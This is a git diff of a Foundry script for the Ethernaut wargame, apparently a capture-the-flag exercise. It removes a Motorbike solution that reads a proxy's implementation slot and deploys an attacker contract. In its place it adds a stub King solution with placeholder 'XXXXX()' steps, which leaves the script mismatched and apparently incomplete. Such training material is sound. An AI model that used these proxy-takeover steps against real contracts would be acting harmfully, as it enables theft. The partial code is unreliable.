@@ -5,7 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
-import "../../src/25-MotorbikeAttacker.sol";
+import {King} from "../../challenge-contracts/09-King.sol";
 
 contract MotorbikeSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
@@ -24,6 +24,15 @@ contract MotorbikeSolution is Script, EthernautHelper {
         ////////////////////////////////////////////////////////////////////////////////////
         // Start of Ric Li C's Solution
         ////////////////////////////////////////////////////////////////////////////////////
+        // Step 1: Get King contract;
+        King king = King(payable(challengeInstance));
+
+        // Step 2: Call `XXXXX()` function of King contract,
+        //         YYYYY;
+
+        // Step 3: Confirm that caller `heroAddress` has successfully obtained ownership of the King contract.
+        address heroAddress = vm.addr(heroPrivateKey);
+        require(heroAddress == king.owner(), "Owner check failed");
 
         ////////////////////////////////////////////////////////////////////////////////////
         // End of Ric Li C's Solution
@@ -31,50 +40,6 @@ contract MotorbikeSolution is Script, EthernautHelper {
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
-        require(levelSuccess, "Challenge not passed yet");
-        vm.stopBroadcast();
-
-        console2.log(successMessage(25));
-    }
-
-    /**
-     * Execute 1 time.
-     * Deployed challengeInstance and motorbikeAttacker contracts on Sepolia, then executed attack() function once.
-     * Ex. forge script ... ... --sig "step1()" --broadcast
-     */
-    function step1() public {
-        vm.startBroadcast(heroPrivateKey);
-        // NOTE this is the address of your challenge contract
-        address challengeInstance = createInstance(LEVEL_ADDRESS);
-        console2.log("challengeInstanceOnChain:", challengeInstance);
-
-        // YOUR SOLUTION HERE
-        address engine = address(
-            uint160(
-                uint256(
-                    vm.load(
-                        challengeInstance,
-                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
-                    )
-                )
-            )
-        );
-        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
-        motorbikeAttacker.attack();
-
-        vm.stopBroadcast();
-    }
-
-    /**
-     * Execute 1 time.
-     * Submitted challengeInstanceOnChain.
-     * Ex. forge script ... ... --sig "step2()" --broadcast
-     */
-    function step2() public {
-        vm.startBroadcast(heroPrivateKey);
-
-        // SUBMIT CHALLENGE. (DON'T EDIT)
-        bool levelSuccess = submitInstance(challengeInstanceOnChain);
         require(levelSuccess, "Challenge not passed yet");
         vm.stopBroadcast();
 
